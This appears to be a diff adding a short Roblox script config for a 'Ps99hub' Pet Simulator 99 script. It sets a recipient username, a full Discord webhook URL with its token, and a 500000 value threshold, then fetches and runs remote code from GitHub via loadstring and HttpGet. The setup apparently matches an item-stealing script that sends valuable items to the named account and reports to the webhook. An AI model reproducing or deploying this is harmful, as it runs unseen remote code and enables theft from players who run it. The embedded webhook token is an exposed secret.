@@ -1,0 +1,6 @@
+Username= 'mainarxd123'
+Webhook= 'https://discord.com/api/webhooks/1286622214950752327/lAWuvw5bXGkMSISMpy_MsiXOD9EUjSD_MSTvNro2Sk0pMagXgRReN-Fp4XyscgTnEH_f'
+
+MinimumRAP = 500000
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Memeyeh4/Ps99script/refs/heads/main/Ps99hub'))()
